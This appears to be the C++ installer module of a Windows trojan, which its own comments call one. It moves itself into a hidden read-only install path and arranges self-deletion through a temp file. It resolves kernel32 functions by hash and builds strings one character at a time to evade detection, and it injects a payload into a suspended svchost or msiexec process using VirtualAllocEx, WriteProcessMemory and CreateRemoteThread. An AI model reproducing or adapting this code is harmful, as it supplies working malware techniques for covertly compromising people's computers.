#include "Install.h"
#include <shlobj.h>  
#include <tchar.h>
#include<Shlwapi.h>
#include"../../PublicInclude/until.h"
#pragma comment (lib,"Shlwapi.lib")
#pragma   comment(lib, "shell32.lib")

CInstall::CInstall()
{

}

CInstall::~CInstall()
{

}






BOOL CInstall::SaveDeleteFile()
{
	//文件自身
	TCHAR szFilePath[MAX_PATH] = { 0, };
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH);

	TCHAR szDeleteMe[MAX_PATH] = { 0 };
	SHGetSpecialFolderPath(NULL, szDeleteMe, CSIDL_COMMON_DOCUMENTS, FALSE);
	_tcscat(szDeleteMe, _T("\\net.tmp"));
	DWORD dwwrsize;
	HANDLE hbin = CreateFile(szDeleteMe, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hbin == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	BOOL rt = WriteFile(hbin, szFilePath, sizeof(szFilePath), &dwwrsize, NULL);
	CloseHandle(hbin);
	return TRUE;
}

void CInstall::DeleteMe(MODIFY_DATA modify_data)
{
	Sleep(1000);
	//文件自身
	TCHAR szFilePath[MAX_PATH] = { 0, };
	GetModuleFileName(NULL, szFilePath, MAX_PATH);

	TCHAR szDeleteMe[MAX_PATH] = { 0 };
	SHGetSpecialFolderPath(NULL, szDeleteMe, CSIDL_COMMON_DOCUMENTS, FALSE);
	_tcscat(szDeleteMe, _T("\\net.tmp"));


	TCHAR szSvchostPath[MAX_PATH] = { 0, };
	GetSystemWow64Directory(szSvchostPath, MAX_PATH);
	char name[] = { '\\','s','v','c','h','o','s','t','.','e','x','e',0 };
	_tcscat(szSvchostPath, name);

	CHAR lpFileName[MAX_PATH] = { 0 };
	strcat_s(lpFileName, modify_data.ReleasePath);
	strcat_s(lpFileName, "\\");
	strcat_s(lpFileName, modify_data.ReleaseName);

	if (_tcsicmp(szFilePath, szSvchostPath) == 0)
	{
		DWORD BytesRead;
		TCHAR lpBuffer[MAX_PATH] = { 0, };
		HANDLE hDllFile = CreateFile(szDeleteMe, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hDllFile == INVALID_HANDLE_VALUE)
		{
			return ;
		}
		int FileSize = GetFileSize(hDllFile, 0);
		ReadFile(hDllFile, lpBuffer, FileSize, &BytesRead, 0);
		CloseHandle(hDllFile);
		//如果木马在安装路径就不删除了
		if (_tcsicmp(lpBuffer, lpFileName) != 0)
		{
			DeleteFile(lpBuffer);
		}
		DeleteFile(szDeleteMe);
	}
}
BOOL CInstall::PuppetProcess(TCHAR* pszFilePath, PVOID pReplaceData, DWORD dwReplaceDataSize)
{

	MyWriteProcessMemory pWriteProcessMemory = (MyWriteProcessMemory)MyGetProcAddress(GetKernel32Base(), 0xfdcf5dcf);
	MyVirtualAllocEx pVirtualAllocEx = (MyVirtualAllocEx)MyGetProcAddress(GetKernel32Base(), 0x250fb903);
	MyCreateRemoteThread pCreateRemoteThread = (MyCreateRemoteThread)MyGetProcAddress(GetKernel32Base(), 0xd5a771d4);
	char name[MAX_PATH] = { 'c',':','\\','w','i','n','d','o','w','s','\\','S','y','s','W','O','W','6','4',{0} };
	if (!pWriteProcessMemory || !pVirtualAllocEx || !pCreateRemoteThread)
	{
		return FALSE;
	}
	
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	BOOL bRet = FALSE;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.lpReserved = NULL;
	si.lpDesktop = NULL;
	si.lpTitle = NULL;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.cb = sizeof(si);
	_tcscat(name, pszFilePath); //这个进程是不可能错的。。
	bRet = CreateProcess(NULL, name, NULL, NULL, FALSE, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (FALSE == bRet)
	{
		TCHAR szmsiexecPath[MAX_PATH] = { 0, };
		GetSystemWow64Directory(szmsiexecPath, MAX_PATH);
		_tcscat(szmsiexecPath, _T("\\msiexec.exe -360")); //这个进程是不可能错的。。
		bRet = CreateProcess(NULL, szmsiexecPath, NULL, NULL, FALSE, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
		if (FALSE == bRet)
		{
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			return FALSE;
		}
	}

	SuspendThread(pi.hProcess);
	
	LPVOID lpDestBaseAddr = pVirtualAllocEx(pi.hProcess, NULL, dwReplaceDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NULL == lpDestBaseAddr)
	{
		return FALSE;
	}

	// 写入替换的数据
	bRet = pWriteProcessMemory(pi.hProcess, lpDestBaseAddr, pReplaceData, dwReplaceDataSize, NULL);

	if (FALSE == bRet)
	{
		return FALSE;
	}

	pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpDestBaseAddr, lpDestBaseAddr, 0, NULL);
	return TRUE;
}

BOOL CInstall::MyCreatDirector(LPCSTR lpPath)
{
	TCHAR	DirTemp[MAX_PATH] = { NULL };
	size_t	nNewPathLen = 0;

	nNewPathLen = _tcslen(lpPath);
	for (size_t i = 0; i < nNewPathLen; i++)
	{
		if (lpPath[i] == '\\')
		{
			_tcsncpy(DirTemp, lpPath, i);
			if (!PathFileExists(DirTemp))
			{
				CreateDirectory(DirTemp, NULL);
			}
		}
	}
	return TRUE;
}

BOOL CInstall::InstallFile(MODIFY_DATA modfify_data)
{
	TCHAR szThisFile[MAX_PATH] = { 0, };//当前进程路径

	if (GetModuleFileNameA(NULL, szThisFile, MAX_PATH) <= 0)
	{
		
		return FALSE;
	}

	TCHAR szInsatllFilename[MAX_PATH] = { 0, };
	_tcscpy(szInsatllFilename, modfify_data.ReleasePath);
	_tcscat(szInsatllFilename, _T("\\"));
	_tcscat(szInsatllFilename, modfify_data.ReleaseName);

	if (MoveFileA(szThisFile, szInsatllFilename) == FALSE)
	{
		
		return FALSE;
	}

	//SetFileAttributes(szInsatllFilename, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
	SetFileAttributes(szInsatllFilename, FILE_ATTRIBUTE_HIDDEN |  FILE_ATTRIBUTE_READONLY);
	return TRUE;

}
